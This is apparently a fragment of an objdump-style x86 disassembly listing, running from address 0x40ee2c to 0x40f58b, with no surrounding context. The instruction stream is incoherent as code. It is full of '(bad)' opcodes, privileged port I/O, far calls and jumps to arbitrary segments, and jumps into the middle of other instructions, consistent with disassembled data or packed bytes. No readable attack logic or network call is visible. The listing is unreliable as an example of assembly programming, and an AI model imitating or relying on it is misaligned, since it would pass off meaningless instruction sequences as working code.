  40ee2c:	cs sub eax,0x819c4fb0
  40ee32:	mov    ecx,0xc2a0b068
  40ee37:	push   ss
  40ee38:	fisubr DWORD PTR [ebp+0x44d7101]
  40ee3e:	xor    al,0x89
  40ee40:	and    bl,BYTE PTR [eax]
  40ee42:	or     cl,BYTE PTR [ebx-0x69]
  40ee45:	xchg   esi,eax
  40ee46:	imul   esi,DWORD PTR [ebx-0x4c5bc150],0x2e
  40ee4d:	pop    eax
  40ee4e:	(bad)  
  40ee4f:	(bad)  
  40ee50:	adc    al,0xdc
  40ee52:	push   esi
  40ee53:	sbb    BYTE PTR [ecx+0x2a],0xa2
  40ee57:	jecxz  0x40ee3d
  40ee59:	adc    bl,bl
  40ee5b:	outs   dx,BYTE PTR ds:[esi]
  40ee5c:	ins    DWORD PTR es:[edi],dx
  40ee5d:	fcmovnu st,st(0)
  40ee5f:	iret   
  40ee60:	(bad)  
  40ee63:	inc    ebx
  40ee64:	inc    ebx
  40ee65:	loopne 0x40edf9
  40ee67:	out    dx,al
  40ee68:	cmp    bl,bl
  40ee6a:	add    cl,BYTE PTR [ebp+0x5b23326d]
  40ee70:	push   esp
  40ee71:	jnp    0x40ee00
  40ee73:	and    ch,bh
  40ee75:	mov    dh,0x6d
  40ee77:	ins    DWORD PTR es:[edi],dx
  40ee78:	ins    BYTE PTR es:[edi],dx
  40ee79:	pop    ss
  40ee7a:	mov    esi,0x9e79df90
  40ee7f:	jecxz  0x40ee2f
  40ee81:	sbb    dh,BYTE PTR [esi+0x24c6e16d]
  40ee87:	aas    
  40ee88:	pop    esp
  40ee89:	sub    al,0x3d
  40ee8b:	les    esp,FWORD PTR [ecx+0x6cc6c217]
  40ee91:	cmp    esp,DWORD PTR [edx+0x56f38516]
  40ee97:	adc    al,0xe8
  40ee99:	inc    ecx
  40ee9a:	mov    eax,ds:0x1136b6b6
  40ee9f:	add    BYTE PTR [esi],al
  40eea1:	js     0x40ee97
  40eea3:	neg    edi
  40eea5:	dec    edx
  40eea6:	mov    eax,ds:0x35d6ed40
  40eeab:	aam    0x3f
  40eead:	adc    al,cl
  40eeaf:	or     ch,cl
  40eeb1:	(bad)
  40eeb4:	ins    DWORD PTR es:[edi],dx
  40eeb5:	dec    esi
  40eeb6:	sbb    bh,bl
  40eeb8:	test   al,0x54
  40eeba:	xchg   edi,eax
  40eebb:	sbb    BYTE PTR [esi-0x4a4912c],bh
  40eec1:	lahf   
  40eec2:	mov    esp,0xfe71e651
  40eec7:	imul   ebx,DWORD PTR [esi],0xffffffed
  40eeca:	push   0xbb5b0b85
  40eecf:	mov    eax,ds:0x1a08f584
  40eed4:	and    eax,0x9a277597
  40eed9:	test   al,0x9a
  40eedb:	xor    BYTE PTR [esi+0x6323f5a2],0x50
  40eee2:	fucomp st(0)
  40eee4:	mov    BYTE PTR [eax-0x38],bl
  40eee7:	je     0x40ee77
  40eee9:	(bad)  
  40eeea:	dec    eax
  40eeeb:	repnz or al,0x5b
  40eeee:	sbb    eax,0x23f2adc1
  40eef3:	repnz mov ah,0x4f
  40eef6:	push   0xada5a48b
  40eefb:	adc    al,0x6c
  40eefd:	clc    
  40eefe:	xor    eax,0xc3b01db4
  40ef03:	add    eax,0x5a85dab6
  40ef08:	ins    DWORD PTR es:[edi],dx
  40ef09:	int3   
  40ef0a:	ins    DWORD PTR es:[edi],dx
  40ef0b:	sti    
  40ef0c:	adc    eax,DWORD PTR [esi-0x19]
  40ef0f:	add    bl,BYTE PTR [ebx+0x17]
  40ef12:	aam    0xd6
  40ef14:	jnp    0x40ef80
  40ef16:	(bad)  
  40ef17:	aam    0x21
  40ef19:	iret   
  40ef1a:	rol    DWORD PTR [edi-0x464424e5],0xbe
  40ef21:	fcomp  st(1)
  40ef23:	sbb    bh,dl
  40ef25:	retf   0x50d3
  40ef28:	stos   BYTE PTR es:[edi],al
  40ef29:	sbb    ecx,DWORD PTR [ebp-0x76]
  40ef2c:	mov    edi,0x9fb31f24
  40ef31:	stos   BYTE PTR es:[edi],al
  40ef32:	fisubr DWORD PTR [ebp+0x3a76a9b0]
  40ef38:	mov    dh,0x61
  40ef3a:	and    eax,ecx
  40ef3c:	ret    0xd6d6
  40ef3f:	fdiv   st,st(5)
  40ef41:	lods   al,BYTE PTR ds:[esi]
  40ef42:	cdq    
  40ef43:	loopne 0x40ef93
  40ef45:	mov    ebx,0xb6d01ff0
  40ef4a:	test   ebx,ebx
  40ef4c:	das    
  40ef4d:	jno    0x40eef3
  40ef4f:	push   edi
  40ef50:	and    eax,0x7a6ec291
  40ef55:	pop    eax
  40ef56:	sub    BYTE PTR [edi-0x48],bl
  40ef59:	sub    al,bh
  40ef5b:	mov    bl,0x3a
  40ef5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef5e:	add    BYTE PTR [edx],al
  40ef60:	int3   
  40ef61:	retf   0xa523
  40ef64:	or     eax,0x443cdda0
  40ef69:	mov    gs,WORD PTR [edi]
  40ef6b:	mov    esp,0x52c2446a
  40ef70:	mov    ebx,0x775f62b5
  40ef75:	inc    ebx
  40ef76:	sub    al,0x32
  40ef78:	push   eax
  40ef79:	shl    ecx,cl
  40ef7b:	scas   al,BYTE PTR es:[edi]
  40ef7c:	mov    al,ds:0xd8d5c6ed
  40ef81:	lahf   
  40ef82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef83:	cmp    bl,dh
  40ef85:	mov    ds:0xb714daa0,eax
  40ef8a:	jge    0x40efa6
  40ef8c:	and    BYTE PTR [ecx],ah
  40ef8e:	and    bh,BYTE PTR [edx-0x35]
  40ef91:	sbb    ecx,DWORD PTR [ebx]
  40ef93:	lea    ebp,[eax-0x17]
  40ef96:	xchg   ebx,eax
  40ef97:	and    BYTE PTR [edx+0x52ef6cb2],dh
  40ef9d:	sub    BYTE PTR [ebx],0x6e
  40efa0:	sub    al,0x84
  40efa2:	addr16 inc bx
  40efa5:	mov    edx,0x92c2ea00
  40efaa:	std    
  40efab:	icebp  
  40efac:	fwait
  40efad:	cdq    
  40efae:	test   BYTE PTR [ebp-0xcdebfbe],ah
  40efb4:	inc    edx
  40efb5:	sti    
  40efb6:	mov    dh,0xd0
  40efb8:	inc    ecx
  40efb9:	aam    0x48
  40efbb:	popf   
  40efbc:	in     eax,dx
  40efbd:	push   es
  40efbe:	cmp    bl,bl
  40efc0:	cwde   
  40efc1:	movzx  eax,BYTE PTR [ebp+0x2386e3ed]
  40efc8:	mov    ebp,0xf76b0125
  40efcd:	pop    ecx
  40efce:	mov    ch,0x5b
  40efd0:	add    edx,eax
  40efd2:	push   eax
  40efd3:	dec    esi
  40efd4:	adc    esp,esp
  40efd6:	fwait
  40efd7:	sbb    eax,0xdc072fd6
  40efdc:	sbb    al,0x2c
  40efde:	shr    DWORD PTR [edi+0x11],1
  40efe1:	aam    0x8d
  40efe3:	fadd   DWORD PTR [edx-0x3e]
  40efe6:	mov    dh,0xd1
  40efe8:	push   edx
  40efe9:	xchg   edi,eax
  40efea:	mov    edi,0x2062013c
  40efef:	retf   
  40eff0:	sbb    edx,ebx
  40eff2:	lea    esp,[esi-0x17083d1e]
  40eff8:	loop   0x40f066
  40effa:	jl     0x40efe2
  40effc:	push   ebx
  40effd:	push   0x62db6b6b
  40f002:	pushf  
  40f003:	adc    DWORD PTR [ebp-0x3144d769],ecx
  40f009:	mov    ch,BYTE PTR [esi]
  40f00b:	sub    BYTE PTR [ebp+0xedaf458],0xa
  40f012:	aam    0x2e
  40f014:	xchg   ebp,eax
  40f015:	popa   
  40f016:	lds    esi,FWORD PTR [eax-0xf]
  40f019:	cwde   
  40f01a:	imul   esp,DWORD PTR [eax],0x58
  40f01d:	pop    edx
  40f01e:	fsub   DWORD PTR [ebx+ebx*1+0x6838e7bb]
  40f025:	lea    ecx,[ebx]
  40f027:	fcmovnbe st,st(6)
  40f029:	jmp    0x40efed
  40f02b:	pushf  
  40f02c:	sbb    eax,0x47f340d9
  40f031:	not    BYTE PTR [esp+ebx*8+0x4a]
  40f035:	inc    ebp
  40f036:	cmp    ebx,edi
  40f038:	sbb    esi,DWORD PTR [ebp+0x76021b04]
  40f03e:	mov    esp,0x515a0a0b
  40f043:	repnz mov ah,0x6c
  40f046:	ins    DWORD PTR es:[edi],dx
  40f047:	jb     0x40f089
  40f049:	push   ebx
  40f04a:	xchg   esi,eax
  40f04b:	add    dl,dh
  40f04d:	adc    edx,DWORD PTR [ebp+ebp*2-0x45]
  40f051:	aam    0x11
  40f053:	scas   al,BYTE PTR es:[edi]
  40f054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f055:	push   ebx
  40f056:	push   esi
  40f057:	mov    esi,0x2dcea347
  40f05c:	sub    eax,0xec0db46d
  40f061:	mul    BYTE PTR ds:0x366be8a7
  40f067:	test   eax,0x7ab0b535
  40f06c:	fadd   DWORD PTR [edi]
  40f06e:	fwait
  40f06f:	add    edx,DWORD PTR [ebp+0x68]
  40f072:	and    eax,DWORD PTR [ebx]
  40f074:	shl    DWORD PTR [ebp+0x850b876],1
  40f07a:	sub    ebp,0xffffffb6
  40f07d:	pusha  
  40f07e:	or     ecx,DWORD PTR [ebx]
  40f080:	fild   DWORD PTR [edx+0x2a]
  40f083:	push   edx
  40f084:	mov    edx,0xcfd6f25c
  40f089:	and    ch,BYTE PTR [ecx]
  40f08b:	mov    edx,0x88b56e28
  40f090:	pop    ss
  40f091:	loop   0x40f0f6
  40f093:	mov    ds:0x8581dd79,al
  40f098:	mov    dh,0xdd
  40f09a:	xchg   BYTE PTR [edi],ah
  40f09c:	sub    BYTE PTR [esi],bh
  40f09e:	clc    
  40f09f:	pop    ss
  40f0a0:	call   0x76da:0x1616277b
  40f0a7:	xchg   BYTE PTR [edx+0x431aacc5],dl
  40f0ad:	dec    ebx
  40f0ae:	cli    
  40f0af:	sub    BYTE PTR [eax-0x55],0x1a
  40f0b3:	xchg   edi,eax
  40f0b4:	bound  edx,QWORD PTR [edx]
  40f0b6:	mov    edx,0x36e3977b
  40f0bb:	shr    BYTE PTR [ebp+0x2355d701],0x97
  40f0c2:	jmp    0x5c0ee53d
  40f0c7:	mov    ebx,0x298b142d
  40f0cc:	imul   esi,DWORD PTR [edi+edx*4+0x72],0xffffffcb
  40f0d1:	dec    ebp
  40f0d2:	outs   dx,DWORD PTR ds:[esi]
  40f0d3:	fdiv   QWORD PTR [esi+0x7180a006]
  40f0d9:	mov    dl,0x23
  40f0db:	mov    al,ds:0xc27d15d7
  40f0e0:	push   esi
  40f0e1:	test   al,0xb6
  40f0e3:	fsubr  QWORD PTR [ebx-0x24]
  40f0e6:	retf   
  40f0e7:	cmp    BYTE PTR [edx],cl
  40f0e9:	fcom   QWORD PTR [esi]
  40f0eb:	sbb    al,al
  40f0ed:	mov    ds:0xe08d0168,eax
  40f0f2:	call   0x9a2d:0xadda9773
  40f0f9:	dec    ebx
  40f0fa:	imul   edx,DWORD PTR [ecx],0x5b
  40f0fd:	ds jmp 0x75e0bac2
  40f103:	adc    eax,0x7c4c0b6c
  40f108:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f109:	ret    
  40f10a:	mov    ds:0xbb6d6da4,eax
  40f10f:	mov    al,0xda
  40f111:	int    0xdf
  40f113:	imul   edi,DWORD PTR [ebp-0x10436a80],0x46dbb694
  40f11d:	mov    ebx,0x209eb63e
  40f122:	nop
  40f123:	push   ds
  40f124:	(bad)  
  40f125:	sbb    al,0x24
  40f127:	fwait
  40f128:	dec    edi
  40f129:	mov    ebx,0xf595b1b1
  40f12e:	mov    ecx,0x965cccfb
  40f133:	stc    
  40f134:	stos   BYTE PTR es:[edi],al
  40f135:	sbb    eax,0x602e041b
  40f13a:	repz push ecx
  40f13c:	test   eax,0xb6836b1b
  40f141:	adc    BYTE PTR [edx],dl
  40f143:	(bad)  
  40f144:	sbb    ch,BYTE PTR [eax+edi*2]
  40f147:	loop   0x40f16b
  40f149:	outs   dx,BYTE PTR ds:[esi]
  40f14a:	dec    ebp
  40f14b:	jo     0x40f0ef
  40f14d:	cmc    
  40f14e:	ja     0x40f17b
  40f150:	aam    0x11
  40f152:	inc    ecx
  40f153:	or     DWORD PTR [eax+0x8],ebx
  40f156:	sbb    dl,BYTE PTR [ecx]
  40f158:	mov    bl,0x3b
  40f15a:	add    BYTE PTR [eax+ecx*4],bl
  40f15d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f15e:	jb     0x40f101
  40f160:	dec    ecx
  40f161:	in     eax,0xd7
  40f163:	leave  
  40f164:	sbb    DWORD PTR [esi+0x65],0x2b
  40f168:	adc    BYTE PTR [ecx+esi*8],dl
  40f16b:	je     0x40f1cf
  40f16d:	sub    al,0x94
  40f16f:	stos   BYTE PTR es:[edi],al
  40f170:	test   edx,edx
  40f172:	push   ds
  40f173:	xchg   ebx,eax
  40f174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f175:	cli    
  40f176:	pop    eax
  40f177:	fidivr WORD PTR [edx-0x29d24e50]
  40f17d:	or     al,0xb9
  40f17f:	cs dec esi
  40f181:	(bad)  
  40f182:	jmp    0x40f138
  40f184:	xchg   ecx,eax
  40f185:	mov    dh,0x74
  40f187:	imul   ecx,DWORD PTR [eax+0x2e892f66],0x31
  40f18e:	cmc    
  40f18f:	fucomip st,st(7)
  40f191:	(bad)  
  40f192:	out    0x6a,al
  40f194:	mov    bh,0x53
  40f196:	mov    al,0xb3
  40f198:	jmp    0xf1919394
  40f19d:	pop    eax
  40f19e:	push   0x13edc45b
  40f1a3:	cwde   
  40f1a4:	cmc    
  40f1a5:	(bad)  
  40f1a6:	std    
  40f1a7:	popa   
  40f1a8:	arpl   bx,bx
  40f1aa:	fcmovb st,st(6)
  40f1ac:	scas   eax,DWORD PTR es:[edi]
  40f1ad:	jmp    0x40f1f7
  40f1af:	xchg   edx,eax
  40f1b0:	xor    cl,BYTE PTR [ebp+0x575bafd2]
  40f1b6:	lds    esi,FWORD PTR [esi-0x8]
  40f1b9:	dec    esi
  40f1ba:	imul   edx,DWORD PTR ds:0x80ceac24,0x6e
  40f1c1:	sub    al,0xc4
  40f1c3:	sbb    DWORD PTR [ecx+0x6f],0xa078cfde
  40f1ca:	mov    ebx,0xaeda176
  40f1cf:	pop    ss
  40f1d0:	sbb    al,0x8f
  40f1d2:	dec    edx
  40f1d3:	jo     0x40f1ba
  40f1d5:	rcl    esp,1
  40f1d7:	xor    BYTE PTR [eax],dl
  40f1d9:	fdiv   QWORD PTR [esi+0x4e297e11]
  40f1df:	ins    DWORD PTR es:[edi],dx
  40f1e0:	pop    edi
  40f1e1:	jne    0x40f24e
  40f1e3:	mov    bh,0x85
  40f1e5:	push   ecx
  40f1e6:	mov    al,0x5c
  40f1e8:	fsubr  st(4),st
  40f1ea:	push   0xed11ad83
  40f1ef:	mov    dh,0x35
  40f1f1:	mov    al,ds:0xb00287f4
  40f1f6:	gs into 
  40f1f8:	out    0xd4,al
  40f1fa:	dec    edx
  40f1fb:	cs xchg esi,eax
  40f1fd:	mov    dh,0x2a
  40f1ff:	(bad)
  40f203:	fadd   QWORD PTR [ebp+ebp*4+0x2b]
  40f207:	xchg   esi,eax
  40f208:	or     BYTE PTR [edi+esi*1],cl
  40f20b:	cmp    edi,0xd85b6d4a
  40f211:	(bad)  
  40f213:	loopne 0x40f1cb
  40f215:	repnz div DWORD PTR [edx*2-0x3958bbbc]
  40f21d:	(bad)  
  40f21e:	(bad)  
  40f21f:	mov    bh,BYTE PTR [esi+0x39]
  40f222:	sub    al,0x31
  40f224:	ss pop es
  40f226:	sbb    BYTE PTR [ebx],bl
  40f228:	or     ebx,ebx
  40f22a:	(bad)  
  40f22b:	mov    bh,BYTE PTR [edi+0x61]
  40f22e:	xlat   BYTE PTR ds:[ebx]
  40f22f:	adc    DWORD PTR [ebp-0x76c7c091],esi
  40f235:	pusha  
  40f236:	fld    TBYTE PTR [esi+0x53]
  40f239:	scas   eax,DWORD PTR es:[edi]
  40f23a:	int    0x3e
  40f23c:	jmp    0xc6aaa4af
  40f241:	repnz lea ebp,[ebp+0x984e6b7]
  40f248:	xor    eax,0xa4da003c
  40f24d:	and    DWORD PTR [ebp+0x0],ebp
  40f250:	outs   dx,BYTE PTR ds:[esi]
  40f251:	fistp  DWORD PTR [ecx+ebp*8+0x46ac50ea]
  40f258:	fdivr  DWORD PTR [esi+0x6b701773]
  40f25e:	test   eax,0x911b988c
  40f263:	mov    dl,0x95
  40f265:	mov    ah,0x1a
  40f267:	mov    ds:0x92506db6,al
  40f26c:	out    dx,eax
  40f26d:	mov    ah,0x35
  40f26f:	out    0x8a,al
  40f271:	arpl   WORD PTR [edi-0x12d25c93],si
  40f277:	gs std 
  40f279:	cwde   
  40f27a:	cmp    ecx,DWORD PTR [esi-0x2f8619dd]
  40f280:	(bad)  
  40f281:	cmp    ch,BYTE PTR [edx-0x3b]
  40f284:	jns    0x40f26b
  40f286:	pop    ds
  40f287:	xor    cl,BYTE PTR [eax-0x73]
  40f28a:	mov    dh,0x75
  40f28c:	adc    al,dl
  40f28e:	aaa    
  40f28f:	in     al,dx
  40f290:	mov    ebx,0x5476fec2
  40f295:	mov    bh,0x4a
  40f297:	sub    al,0xfd
  40f299:	and    al,0xe3
  40f29b:	cli    
  40f29c:	inc    esi
  40f29d:	or     ch,bh
  40f29f:	inc    edx
  40f2a0:	in     eax,dx
  40f2a1:	(bad)  
  40f2a2:	rol    DWORD PTR ds:0xc8239634,1
  40f2a8:	mov    bl,dh
  40f2aa:	pop    esp
  40f2ab:	loopne 0x40f29f
  40f2ad:	lods   eax,DWORD PTR ds:[esi]
  40f2ae:	test   edx,ebp
  40f2b0:	sub    esi,ebx
  40f2b2:	icebp  
  40f2b3:	adc    al,0x72
  40f2b5:	add    BYTE PTR [esi+ebx*1-0x49e9a2b8],dl
  40f2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2bd:	faddp  st(1),st
  40f2bf:	sub    al,0x3a
  40f2c1:	cs pusha 
  40f2c3:	arpl   WORD PTR [esi+edx*1],di
  40f2c6:	fisub  DWORD PTR [esi]
  40f2c8:	add    esi,DWORD PTR [ebx+0x50dbca9e]
  40f2ce:	xor    al,0x1a
  40f2d0:	popa   
  40f2d1:	arpl   bx,bx
  40f2d3:	push   ss
  40f2d4:	addr16 jge 0x40f30c
  40f2d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2d8:	sbb    eax,0xf4a9cfa0
  40f2dd:	mov    dh,0x54
  40f2df:	mov    esi,0xd1d6f674
  40f2e4:	or     BYTE PTR [eax],al
  40f2e6:	jo     0x40f2a3
  40f2e8:	dec    BYTE PTR [eax]
  40f2ea:	mov    al,0xb6
  40f2ec:	push   cs
  40f2ed:	jmp    0xc2d1:0xc20da9c2
  40f2f4:	jns    0x40f2d9
  40f2f6:	mov    ds:0x3605a5da,eax
  40f2fb:	ss jb  0x40f2dc
  40f2fe:	ins    DWORD PTR es:[edi],dx
  40f2ff:	mov    WORD PTR [esi-0x3],?
  40f302:	sahf   
  40f303:	adc    al,0xa8
  40f305:	lods   eax,DWORD PTR ds:[esi]
  40f306:	fstp   QWORD PTR [edi-0x65]
  40f309:	je     0x40f2b8
  40f30b:	xchg   edx,eax
  40f30c:	mov    esp,DWORD PTR [ecx]
  40f30e:	(bad)  
  40f310:	sbb    BYTE PTR [ebx],0xb6
  40f313:	(bad)  
  40f314:	mov    ebp,0xb0e45048
  40f319:	inc    eax
  40f31a:	jo     0x40f2c5
  40f31c:	fld    QWORD PTR [ecx]
  40f31e:	pop    edx
  40f31f:	dec    edx
  40f320:	ret    0xc898
  40f323:	sub    al,0x60
  40f325:	loope  0x40f2fd
  40f327:	(bad)  
  40f328:	loopne 0x40f2b9
  40f32a:	cmc    
  40f32b:	xor    al,0xdc
  40f32d:	call   0xb404:0xdb694077
  40f334:	mov    ds:0x60a12aba,eax
  40f339:	(bad)  [ebp+ebp*4+0x56dbb6da]
  40f340:	adc    BYTE PTR [ebp+ebx*1-0x30],dl
  40f344:	icebp  
  40f345:	push   eax
  40f346:	test   al,0xc5
  40f348:	enter  0xd2d5,0x56
  40f34c:	pop    eax
  40f34d:	jmp    0x85cd7569
  40f352:	add    eax,0xc05d0bf0
  40f357:	inc    esi
  40f358:	add    DWORD PTR [edx-0x7ddd428],0x6c6ed6c2
  40f362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f363:	dec    edi
  40f364:	inc    eax
  40f365:	(bad)  
  40f366:	xchg   ecx,eax
  40f367:	inc    edi
  40f368:	cmp    BYTE PTR [esp+esi*1-0x55],bl
  40f36c:	or     ebp,edx
  40f36e:	rol    BYTE PTR [ecx+0x20],cl
  40f371:	ror    DWORD PTR [edx],1
  40f373:	popf   
  40f374:	jmp    0x40f34f
  40f376:	jbe    0x40f319
  40f378:	jo     0x40f3dd
  40f37a:	adc    BYTE PTR [edi-0x29],ch
  40f37d:	add    DWORD PTR [eax-0x60],0x8dad2268
  40f384:	jbe    0x40f387
  40f386:	shr    esi,0xa4
  40f389:	scas   eax,DWORD PTR es:[edi]
  40f38a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f38b:	fsubr  QWORD PTR ds:0x416e346c
  40f391:	xlat   BYTE PTR ds:[ebx]
  40f392:	pusha  
  40f393:	xchg   DWORD PTR [esi+0x4c],ecx
  40f396:	test   eax,0xb80bb642
  40f39b:	mov    ch,0x12
  40f39d:	inc    edi
  40f39e:	inc    eax
  40f39f:	mov    ebp,0xfedbd5cb
  40f3a4:	adc    al,0x4f
  40f3a6:	ins    DWORD PTR es:[edi],dx
  40f3a7:	sbb    esi,DWORD PTR [edi-0x3cd4813e]
  40f3ad:	and    eax,0xa9b456b6
  40f3b2:	ins    BYTE PTR es:[edi],dx
  40f3b3:	adc    al,0x6e
  40f3b5:	or     ebx,DWORD PTR [ebp+0x1bfc32dd]
  40f3bb:	jg     0x40f350
  40f3bd:	mov    bl,0xda
  40f3bf:	lea    eax,[esi]
  40f3c1:	ins    DWORD PTR es:[edi],dx
  40f3c2:	mov    ebp,0x145746ae
  40f3c7:	jl     0x40f440
  40f3c9:	retf   0x75bf
  40f3cc:	fild   DWORD PTR [ebp+edx*8+0x2f]
  40f3d0:	xchg   edx,eax
  40f3d1:	ins    BYTE PTR es:[edi],dx
  40f3d2:	in     eax,0x2b
  40f3d4:	add    dh,bl
  40f3d6:	dec    esp
  40f3d7:	add    BYTE PTR [ebp+0x67],bh
  40f3da:	sub    eax,0x43162d97
  40f3df:	in     eax,dx
  40f3e0:	int3   
  40f3e1:	pop    ss
  40f3e2:	push   edi
  40f3e3:	jne    0x40f395
  40f3e5:	push   ebx
  40f3e6:	les    ebp,FWORD PTR [ebp-0x55]
  40f3e9:	into   
  40f3ea:	add    esi,esp
  40f3ec:	inc    ecx
  40f3ed:	inc    ebx
  40f3ee:	adc    eax,0xdd003603
  40f3f3:	and    BYTE PTR [ebp-0x70e8e30a],dh
  40f3f9:	xchg   DWORD PTR [esi],edi
  40f3fb:	je     0x40f3c6
  40f3fd:	aad    0xb3
  40f3ff:	cs in  al,dx
  40f401:	aas    
  40f402:	stos   DWORD PTR es:[edi],eax
  40f403:	mov    edi,0xe0a6e723
  40f408:	rcl    dh,cl
  40f40a:	mov    eax,ds:0xb4d4081d
  40f40f:	push   ds
  40f410:	sub    eax,0x8176d05d
  40f415:	ret    
  40f416:	and    al,0x87
  40f418:	jns    0x40f428
  40f41a:	ret    0x45d1
  40f41d:	xchg   esi,eax
  40f41e:	outs   dx,BYTE PTR ds:[esi]
  40f41f:	ins    DWORD PTR es:[edi],dx
  40f420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f421:	(bad)  [ebx]
  40f423:	cmp    edi,DWORD PTR [ecx+0x2b]
  40f426:	stos   DWORD PTR es:[edi],eax
  40f427:	cdq    
  40f428:	cmp    cl,0x2b
  40f42b:	mov    edi,0x6492d0b5
  40f430:	jnp    0x40f3f0
  40f432:	pop    esi
  40f433:	addr16 add bl,cl
  40f436:	inc    ebp
  40f437:	mov    eax,ds:0x768585da
  40f43c:	mov    edi,0xd0012088
  40f441:	push   ebp
  40f442:	jg     0x40f468
  40f444:	mov    ecx,0x16db7685
  40f449:	out    dx,al
  40f44a:	push   ecx
  40f44b:	outs   dx,BYTE PTR ds:[esi]
  40f44c:	call   0xf2a6bd59
  40f451:	test   eax,0xd04341cb
  40f456:	iret   
  40f457:	mov    ebx,0x4cfb9258
  40f45c:	lods   eax,DWORD PTR ds:[esi]
  40f45d:	jbe    0x40f4ca
  40f45f:	popa   
  40f460:	repnz dec esp
  40f462:	xor    DWORD PTR [ecx],ebx
  40f464:	fs fwait
  40f466:	outs   dx,BYTE PTR ds:[esi]
  40f467:	in     eax,0x4d
  40f469:	rol    DWORD PTR [ebp+0x43c655d6],1
  40f46f:	hlt    
  40f470:	lds    esp,FWORD PTR [eax+edi*1+0x70]
  40f474:	push   esi
  40f475:	push   0x99f24b6c
  40f47a:	sub    al,0xea
  40f47c:	cmp    DWORD PTR [edi],0xa5896d23
  40f482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f483:	sbb    eax,0x2e05a475
  40f488:	loop   0x40f48f
  40f48a:	std    
  40f48b:	jmp    0x1ffd:0x62e0a5d3
  40f492:	clc    
  40f493:	xchg   edi,eax
  40f494:	ja     0x40f4d1
  40f496:	out    0xa4,eax
  40f498:	fst    QWORD PTR [esi-0x14465e81]
  40f49e:	dec    edx
  40f49f:	into   
  40f4a0:	add    BYTE PTR [edi+0x35],bh
  40f4a3:	add    BYTE PTR [edi],cl
  40f4a5:	nop
  40f4a6:	push   0xb694c1d
  40f4ab:	rcl    BYTE PTR [ecx],0x12
  40f4ae:	fsub   QWORD PTR [ecx]
  40f4b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4b1:	pop    edx
  40f4b2:	push   ebx
  40f4b3:	mov    ds:0x836a4068,eax
  40f4b8:	pushf  
  40f4b9:	outs   dx,BYTE PTR ds:[esi]
  40f4ba:	pop    eax
  40f4bb:	sub    BYTE PTR [edi+esi*4-0x69],ch
  40f4bf:	inc    edi
  40f4c0:	push   ss
  40f4c1:	sub    DWORD PTR [ecx],ecx
  40f4c3:	test   eax,0xd8d82d5e
  40f4c8:	push   ss
  40f4c9:	pop    eax
  40f4ca:	jae    0x40f45d
  40f4cc:	lock out dx,al
  40f4ce:	mov    eax,ds:0xb1f90f7b
  40f4d3:	mov    ah,0x2d
  40f4d5:	mov    ecx,0xe6441d60
  40f4da:	push   edx
  40f4db:	or     DWORD PTR [ebx+ebx*8+0x441a96d8],0xffffffd7
  40f4e3:	hlt    
  40f4e4:	sub    DWORD PTR [ebx],0xffffffb1
  40f4e7:	push   ebx
  40f4e8:	push   esi
  40f4e9:	adc    edx,esp
  40f4eb:	ins    DWORD PTR es:[edi],dx
  40f4ec:	popa   
  40f4ed:	xlat   BYTE PTR ds:[ebx]
  40f4ee:	call   0xd44ce9ff
  40f4f3:	(bad)  
  40f4f4:	mov    al,ds:0x2e42c2ed
  40f4f9:	pop    edi
  40f4fa:	pop    ebp
  40f4fb:	scas   eax,DWORD PTR es:[edi]
  40f4fc:	mov    eax,ds:0xb67905fe
  40f501:	push   ss
  40f502:	push   ss
  40f503:	call   0x5c7c:0xad1f7db1
  40f50a:	inc    eax
  40f50b:	lods   al,BYTE PTR ds:[esi]
  40f50c:	je     0x40f571
  40f50e:	fist   DWORD PTR [esi]
  40f510:	mov    ds:0x6883c8be,eax
  40f515:	jg     0x40f4aa
  40f517:	or     BYTE PTR [edi],cl
  40f519:	fiadd  DWORD PTR [esi-0x10d2b8a0]
  40f51f:	push   cs
  40f520:	into   
  40f521:	test   BYTE PTR [eax-0x249c9cf5],bl
  40f527:	ss xchg ebx,eax
  40f529:	pusha  
  40f52a:	push   ebx
  40f52b:	jbe    0x40f538
  40f52d:	into   
  40f52e:	shl    BYTE PTR [ebx+0x51c8895d],0x71
  40f535:	lahf   
  40f536:	fiadd  WORD PTR [ecx-0x69]
  40f539:	fstp   st(2)
  40f53b:	lods   eax,DWORD PTR ds:[esi]
  40f53c:	jbe    0x40f572
  40f53e:	jmp    0x40f542
  40f540:	push   ebp
  40f541:	mov    edi,DWORD PTR [edi+0x1d]
  40f544:	push   cs
  40f545:	sub    ecx,DWORD PTR [ebx]
  40f547:	pop    esp
  40f548:	fdiv   DWORD PTR [esi-0x1a6ad953]
  40f54e:	dec    edx
  40f54f:	xchg   edi,eax
  40f550:	mov    bl,0xf3
  40f552:	jmp    0x40f58c
  40f554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f555:	(bad)  
  40f556:	push   ebp
  40f557:	sub    al,0xb
  40f559:	adc    dl,BYTE PTR [ecx]
  40f55b:	in     al,dx
  40f55c:	inc    ebp
  40f55d:	add    edi,ebx
  40f55f:	or     eax,0x59ea0ec5
  40f564:	push   0xf36c2e0e
  40f569:	inc    esp
  40f56a:	lods   eax,DWORD PTR ds:[esi]
  40f56b:	test   al,0x40
  40f56d:	dec    ebx
  40f56e:	es xchg ebx,eax
  40f570:	or     edi,DWORD PTR [edx]
  40f572:	or     edi,DWORD PTR [ebx]
  40f574:	mov    ch,BYTE PTR [esi+0x41]
  40f577:	out    dx,al
  40f578:	xchg   BYTE PTR [ebp-0x57ef7c9a],bl
  40f57e:	sub    ch,0xc2
  40f581:	push   ebx
  40f582:	add    edx,DWORD PTR [esi]
  40f584:	sbb    al,0x8e
  40f586:	loope  0x40f58a
  40f588:	gs ins BYTE PTR es:[edi],dx
  40f58a:	pop    esp
  40f58b:	pusha  
